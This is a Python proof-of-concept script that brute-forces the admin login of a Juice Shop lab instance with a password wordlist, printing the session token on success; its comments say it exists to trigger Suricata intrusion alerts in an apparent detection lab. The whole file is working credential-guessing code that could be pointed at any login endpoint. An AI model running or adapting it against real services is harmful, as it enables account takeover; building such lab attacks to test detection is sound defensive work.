#!/usr/bin/env python3
"""Brute Force - Web login against Juice Shop with a wordlist."""

import requests
import json
import sys
import time
from pathlib import Path

TARGET = "http://juice-shop:3000"
WORDLIST = "/app/wordlists/common.txt"
# Known Juice Shop default email
TARGET_EMAIL = "admin@juice-sh.op"


def load_wordlist():
    """Load passwords from wordlist file."""
    wl_path = Path(WORDLIST)
    if not wl_path.exists():
        # Fallback: small inline list
        print(f"[!] Wordlist not found at {WORDLIST}, using inline list")
        return [
            "password", "123456", "admin", "letmein", "welcome",
            "monkey", "dragon", "master", "qwerty", "login",
            "admin123", "abc123", "password1", "iloveyou", "sunshine",
        ]
    return [line.strip() for line in wl_path.read_text().splitlines() if line.strip()]


def main():
    print("[*] Brute Force - Web Login PoC")
    print(f"[*] Target: {TARGET}")
    print(f"[*] Target user: {TARGET_EMAIL}")
    print()

    passwords = load_wordlist()
    print(f"[*] Loaded {len(passwords)} passwords from wordlist")
    print("[*] Starting brute force attack...")
    print()

    login_url = f"{TARGET}/rest/user/login"
    found = False
    start_time = time.time()

    for i, pwd in enumerate(passwords, 1):
        payload = {"email": TARGET_EMAIL, "password": pwd}
        try:
            resp = requests.post(login_url, json=payload, timeout=5)
            status = resp.status_code

            if status == 200:
                data = resp.json()
                if "authentication" in data:
                    elapsed = time.time() - start_time
                    print(f"  [{i:3d}/{len(passwords)}] {pwd:20s} -> STATUS {status} ** VALID **")
                    print()
                    print(f"[+] SUCCESS! Password found: {pwd}")
                    print(f"[+] Attempts: {i}")
                    print(f"[+] Time: {elapsed:.1f}s")
                    print(f"[+] Token: {data['authentication'].get('token', 'N/A')[:50]}...")
                    found = True
                    break
                else:
                    print(f"  [{i:3d}/{len(passwords)}] {pwd:20s} -> STATUS {status} (no auth)")
            elif status == 401:
                print(f"  [{i:3d}/{len(passwords)}] {pwd:20s} -> STATUS {status} (invalid)")
            else:
                print(f"  [{i:3d}/{len(passwords)}] {pwd:20s} -> STATUS {status}")

        except requests.ConnectionError:
            print(f"[-] Connection error at attempt {i}")
            break
        except Exception as e:
            print(f"  [{i:3d}/{len(passwords)}] {pwd:20s} -> ERROR: {e}")

        # Small delay to be visible but still fast enough for demo
        time.sleep(0.1)

    if not found:
        elapsed = time.time() - start_time
        print()
        print(f"[-] Password not found in wordlist ({len(passwords)} attempts, {elapsed:.1f}s)")
        print("[*] The brute force traffic should still trigger Suricata alerts")

    print()
    print("[*] Attack complete. Check Suricata alerts for SID 100005.")

if __name__ == "__main__":
    main()
